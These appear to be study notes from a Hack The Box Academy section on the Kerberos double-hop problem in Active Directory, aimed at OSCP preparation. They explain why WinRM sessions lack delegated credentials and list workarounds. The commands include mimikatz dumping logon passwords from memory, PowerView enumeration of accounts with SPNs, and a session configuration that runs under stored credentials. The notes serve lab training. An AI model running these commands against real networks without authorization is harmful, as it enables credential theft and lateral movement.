# Section 24: Kerberos "Double Hop" Problem

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1573
- Code/command blocks: 9

> Terminal output is omitted; only commands & scripts are captured.

## The OSCP trap

> **This is the classic gotcha that eats hours on the OSCP AD set.** When you land a shell via **WinRM/PSRemoting** (`evil-winrm`, `Enter-PSSession`) using a **password**, that's a *network logon* — your creds are **not delegated to a second hop**. So any command run *from that remote shell* that touches **another** machine (query the DC with PowerView/BloodHound, read `\\dc\share`) fails with **Access Denied** or returns **empty** — even though the same command works locally with those creds.
>
> **Symptom:** `Get-Domain*` / SharpHound / share access returns nothing or "access denied" from inside an `evil-winrm` session, and you wrongly conclude your creds or access are broken. They're not — it's the double hop.
>
> **Fixes:**
> - Pass an **explicit `PSCredential`** so the second hop re-authenticates (the `$cred` pattern below).
> - Use the **`Register-PSSessionConfiguration` / `-ConfigurationName`** trick below (session runs as stored creds).
> - **Easiest on OSCP:** don't pivot *through* the WinRM shell — run the AD-querying tool **from Kali** with the creds directly (`bloodhound-python`, impacket with `user:pass`), or use `runas /netonly`. Sidesteps the double hop entirely.

```powershell
PS C:\Users\{{USERNAME}}.{{DOMAIN_NB}}> Enter-PSSession -ComputerName {{COMPUTER_NAME}} -Credential {{DOMAIN_NB}}\{{NEXT_USER}}
cd 'C:\Users\Public\'
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

```powershell
tasklist /V |findstr {{NEXT_USER}}
```

```cmd
klist
```

```powershell
Enter-PSSession -ComputerName {{COMPUTER_NAME}}.{{DOMAIN_UPPER}} -Credential {{DOMAIN_NB}}\{{NEXT_USER}}
```

```powershell
klist
```

```powershell
Import-Module .\PowerView.ps1
get-domainuser -spn | select samaccountname
```

```powershell
Register-PSSessionConfiguration -Name {{SESSION_NAME}} -RunAsCredential {{DOMAIN_NB}}\{{NEXT_USER}}
```

```powershell
Enter-PSSession -ComputerName {{COMPUTER_NAME}} -Credential {{DOMAIN_NB}}\{{NEXT_USER}} -ConfigurationName  {{SESSION_NAME}}
klist
```

```powershell
get-domainuser -spn | select samaccountname
```